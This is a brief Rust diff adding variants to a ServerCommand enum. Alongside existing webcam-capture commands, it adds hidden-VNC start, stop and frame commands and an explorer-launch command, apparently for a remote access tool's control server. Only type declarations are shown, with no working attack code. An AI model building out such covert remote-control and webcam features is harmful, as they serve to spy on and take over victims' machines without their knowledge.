@@ -81,4 +81,9 @@ pub enum ServerCommand {
 
     RequestWebcam(SocketAddr),
     WebcamResult(SocketAddr, Vec<u8>),
+
+    StartHVNC(SocketAddr),
+    StopHVNC(SocketAddr),
+    OpenExplorer(SocketAddr),
+    HVNCFrame(SocketAddr, Vec<u8>),
 }
